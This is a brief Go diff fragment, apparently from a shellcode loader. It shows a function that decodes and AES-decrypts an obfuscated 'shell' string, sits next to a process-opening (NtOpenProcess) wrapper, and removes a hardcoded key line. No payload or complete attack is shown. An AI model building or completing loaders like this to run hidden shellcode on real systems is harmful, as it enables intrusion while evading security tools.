@@ -232,7 +232,6 @@ func NtOpenP(NtOpenProcess *windows.LazyProc,pid uintptr)(uintptr,uintptr,uintpt
 func sdec(src string)[]byte{
 	aes:= encrypt.NewAES() // 默认是Cbc 模式
 	aes.SetMode(1)
-	aeskey := []byte("sangfor@2021")
 	bsrc :=encrypt.Bagua_de(src)
 	shell := encrypt.Aes_de(bsrc,aeskey,aes)
 
